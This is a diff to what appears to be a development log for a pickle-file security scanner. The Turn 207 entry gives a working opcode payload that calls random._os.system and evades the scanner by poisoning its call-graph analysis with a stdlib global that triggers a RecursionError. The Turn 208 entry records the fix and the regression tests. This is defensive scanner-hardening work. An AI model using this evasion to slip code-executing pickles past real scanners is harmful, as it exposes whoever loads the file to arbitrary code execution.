@@ -11781,3 +11781,134 @@ Performance note:
 - `_find_sink_path("pkgutil.iter_importers")`: `0.0000s`, path
   `("pkgutil.iter_importers", "importlib.import_module")`.
 - `scan_bytes(payload)`: `malicious`, one finding, `0.0008s`.
+
+## Turn 207 - Bypass via call-graph exception poisoning
+
+Found a scanner-clean RCE-capable pickle by poisoning the Python call-graph
+pass with a benign stdlib global that triggers `RecursionError`.
+
+The payload first imports `xml.sax.saxutils.escape` and pops it without
+executing it. It then imports and invokes the call-graph-only RCE primitive
+`random._os.system`:
+
+```text
+PROTO 4
+SHORT_BINUNICODE "xml.sax.saxutils"
+SHORT_BINUNICODE "escape"
+STACK_GLOBAL
+POP
+SHORT_BINUNICODE "random"
+SHORT_BINUNICODE "_os.system"
+STACK_GLOBAL
+SHORT_BINUNICODE "printf turn207-owned > <marker>"
+TUPLE1
+REDUCE
+STOP
+```
+
+Focused proof:
+
+- Control payload with only `random._os.system`:
+  `verdict=malicious`, `status=complete`, one `DANGEROUS_CALL_GRAPH`
+  finding for sink `os.system`, `scan_s=0.009642`.
+- Poison-before payload:
+  `verdict=clean`, `status=complete`, `0` findings, `0` notices,
+  `scan_s=0.374730`.
+- Poison-after payload:
+  `verdict=clean`, `status=complete`, `0` findings, `0` notices,
+  `scan_s=0.361288`.
+- Active import references in the bypass:
+  `xml.sax.saxutils.escape` and `random._os.system`, both with
+  `is_dangerous=False`.
+- Direct call-graph proof:
+  `find_dangerous_call_graphs([random._os.system, xml.sax.saxutils.escape])`
+  raises `RecursionError: maximum recursion depth exceeded`.
+- `_find_sink_path("random._os.system")` still returns
+  `("random._os.system", "os.system")`, proving the lower-level RCE path is
+  known when the call-graph pass is not poisoned.
+- Runtime child-process proof: `pickle.loads(payload)` returned `0` and wrote
+  marker text `turn207-owned`.
+
+Why this was missed:
+
+- `_with_call_graph_findings()` wraps both call-graph passes in one broad
+  `except Exception` and returns the original native report on any failure.
+- `xml.sax.saxutils.escape` is not dangerous at runtime, but analyzing that
+  stdlib module currently recurses through function-local instance alias
+  inference until Python raises `RecursionError`.
+- The exception discards all accumulated call-graph findings. The poison can
+  appear before or after the actual RCE reference and still suppress
+  `random._os.system -> os.system`.
+- The native Rust scanner sees only clean literal globals, so once the Python
+  augmentation fails open the final verdict is clean.
+
+Performance note:
+
+- The bypass spends about `0.36-0.37s` in the poisoned scan before returning a
+  clean report. That is still bounded enough to be practical, but it is a
+  visible regression compared with the `0.0096s` malicious control.
+- The next defensive turn should avoid package-specific blocking and fix the
+  source of the fail-open behavior: isolate call-graph failures per import
+  reference and keep already-found dangerous paths, or fail closed with an
+  explicit analysis-incomplete finding when the call graph raises. A bounded
+  recursion/visited guard in `_resolve_class_target()` and related
+  function-local instance alias inference would also remove this poison source
+  directly.
+
+## Turn 208 - Block call-graph exception poisoning
+
+Implemented a focused call-graph hardening for the Turn 207 fail-open path.
+
+The call-graph scanners now isolate failures at the import-reference and
+entrypoint level:
+
+- `find_dangerous_call_graphs()` resolves entrypoints through a cached safe
+  wrapper. If one pickle global triggers a call-graph exception, that global is
+  skipped instead of aborting the entire RCE pass.
+- `find_startup_hook_write_call_graphs()` uses the same safe entrypoint and
+  path helpers, so file-open/write startup-hook analysis cannot be poisoned by
+  an unrelated reference either.
+- `_with_call_graph_findings()` now invokes the RCE and startup-hook call-graph
+  passes independently. A failure in one augmentation pass no longer discards
+  findings already produced by the other pass.
+
+Regression coverage added to
+`packages/modelaudit-picklescan/tests/test_adversarial_pickle_oracle.py`:
+
+- The test builds the Turn 207 shape with `xml.sax.saxutils.escape` as the
+  no-op poison and `random._os.system` as the RCE primitive.
+- It checks both poison orderings:
+  `xml.sax.saxutils.escape` before `random._os.system`, and after it.
+- `find_dangerous_call_graphs((xml.sax.saxutils.escape, random._os.system))`
+  now returns the `random._os.system -> os.system` finding instead of raising.
+- Both poisoned pickle variants now scan `malicious` with a
+  `DANGEROUS_CALL_GRAPH` finding for sink `os.system`.
+- Runtime proof still executes the poisoned-before payload in a child process
+  and writes marker text `call-graph-poison-owned`.
+
+Focused validation:
+
+- `PROMPTFOO_DISABLE_TELEMETRY=1 /Users/mdangelo/.local/bin/uv run pytest packages/modelaudit-picklescan/tests/test_adversarial_pickle_oracle.py::test_scan_bytes_blocks_call_graph_exception_poisoning_rce packages/modelaudit-picklescan/tests/test_adversarial_pickle_oracle.py::test_scan_bytes_blocks_random_os_import_alias_prefix_rce`
+  passed: `2 passed in 0.89s`.
+
+Full pre-commit validation:
+
+- `ruff format` passed: `391 files left unchanged`.
+- `ruff check --fix` passed.
+- `mypy` passed: `Success: no issues found in 446 source files`.
+- Full non-slow/non-integration validation passed:
+  `3713 passed, 1022 skipped, 21 warnings in 39.72s`.
+
+Performance note:
+
+- Cold `scan_bytes()` on the poison-before payload now returns `malicious` in
+  `0.412494s` with one `DANGEROUS_CALL_GRAPH` finding.
+- The same process then scans the poison-after payload in `0.000151s`, because
+  the safe entrypoint wrapper caches the skipped poison result.
+- A direct mixed call-graph lookup after the poison is cached returns one
+  finding in `0.000004s`.
+- This keeps the defense bounded and avoids package-specific blocking. There
+  is still a cold-path cost for the first distinct recursive call-graph poison;
+  a later simplification pass could avoid that more directly by making
+  function-call collection ignore nested function/class bodies or by adding a
+  recursion guard around class-target resolution.
